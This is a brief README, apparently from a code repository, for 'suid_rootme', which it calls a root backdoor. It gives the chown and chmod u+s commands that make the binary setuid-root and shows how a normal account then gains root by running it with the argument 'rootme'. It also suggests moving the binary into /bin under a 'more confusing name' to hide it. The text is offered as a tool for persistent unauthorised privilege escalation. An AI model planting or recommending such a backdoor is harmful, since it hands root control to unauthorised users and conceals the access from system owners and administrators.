# suid_rootme
root backdoor for suid


Execute the execution with the root account：
~~~
    sudo chown root:root suid_rootme
    sudo chmod u+s suid_rootme
~~~
After that, you can use a normal account to get root privileges
~~~
  ./suid_rootme rootme
~~~

You can move the program to the /bin directory and change it to a more confusing name.
